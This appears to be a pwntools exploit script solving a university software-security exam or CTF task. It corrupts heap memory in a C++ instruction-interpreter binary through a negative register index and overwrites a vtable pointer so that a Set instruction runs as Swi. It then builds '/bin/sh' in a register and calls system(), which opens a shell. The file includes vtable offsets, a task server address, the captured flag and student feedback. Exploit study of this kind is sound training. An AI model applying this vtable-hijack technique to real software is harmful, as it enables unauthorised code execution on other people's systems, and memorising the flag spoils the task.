import pwn

# Feedback: this was too hard for an exam task in my opinion. We do not learn C++ in university at any time. So parsing the code alone is challenging and takes a lot of time (not good for an exam). Even after the vulnerability was found, this way hard to execute. Having one 32-bit inputs makes it unnessercerly hard in my opinion. Took me 4h. I think I would have failed this one in the time. 

#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33274)
conn = pwn.remote('127.0.0.1', 1024)

#pwn.pause()

# we want to smuggle in an Swi instruction with src = "/bin/sh", once we execute it , system("/bin/sh") is called and we have a shell :)

# the Set and Swi instructions both have the same structure, just point to a different vtable

# the RegisterState has a set get vulnerability as we can provide a negative index and read write heap. As register state is at the end, we can manipulate prev instructions

# malicious Set instruction (override vtable pointer to make it Swi)
# Set instruction (dst=4, value= int("/bin/sh\x00"))
# RegisterState


# we do not know the vtable address, but we could read it via get and then add the offset
# get all vtables: objdump -t ./vuln | c++filt | grep vtable
"""
00000000000236c8  w    O .data.rel.ro	0000000000000028              vtable for Sub
0000000000023ba0  w    O .data.rel.ro	0000000000000028              vtable for Instruction
0000000000023718  w    O .data.rel.ro	0000000000000028              vtable for Set
0000000000023740  w    O .data.rel.ro	0000000000000028              vtable for Dump
00000000000236a0  w    O .data.rel.ro	0000000000000028              vtable for Add
00000000000236f0  w    O .data.rel.ro	0000000000000028              vtable for Mul
0000000000023768  w    O .data.rel.ro	0000000000000028              vtable for Swi
"""


# swi is at higher address, so we need to add this to vtable pointer
vtable_offset_set_swi = 0x0000000000023768 - 0x0000000000023718
offset_into_r0_instruction = b'set r0, ' + str(vtable_offset_set_swi).encode('utf-8')
print(offset_into_r0_instruction)
conn.sendline(offset_into_r0_instruction)

# first instruction overrides the vtable from set to swi
offset = 4
change_vtable_instruction = b'add r-' + str(offset).encode('utf-8') +  b', r-' + str(offset).encode('utf-8') + b', r0'
print(change_vtable_instruction)
conn.sendline(change_vtable_instruction)

# we want /bin/sh in r0
# then we have the set instruction that is misinterpreted as swi (we want to override this vtable pointer)
# we only have int (4 bytes), so we need r0 + r1 for string /bin/bash
shell_string_part_1 = b'/bin'
shell_string_part_2 = b'/sh\x00'
shell_int_part_1 = pwn.u32(shell_string_part_1)
shell_int_part_2 = pwn.u32(shell_string_part_2)

instruction_1 = b'set r0, ' + str(shell_int_part_2).encode('utf-8')
conn.sendline(instruction_1)
instruction_2 = b'set r1, 65536'
conn.sendline(instruction_2)
instruction_3 = b'mul r0, r0, r1'
# shift input 32 bit to the left sothat we can add lower 2 bytes
conn.sendline(instruction_3)
conn.sendline(instruction_3)
instruction_4 = b'set r1, ' + str(shell_int_part_1).encode('utf-8')
conn.sendline(instruction_4)
instruction_5 = b'add r0, r0, r1'
conn.sendline(instruction_5)

# r0 now has string: /bin/sh
conn.sendline(b'dump')

# r0 at:  0x608046ec4640
# set at: 0x608046ec4620
# => offset 4*8 => 4

# in r0 is string /bin/sh
# this acutally then is: swi r0, r0
swi_instruction = b'set r0, 0'
print(swi_instruction)
conn.sendline(swi_instruction)

conn.sendline(b'')
# now enjoy your shell :)

#softsec{puwYTba0dYadzR0StlLOzFNY6K1_5zPecnsOKdIt7DO-2MGIIZrwv3PkhHKHGvJp}
conn.interactive()
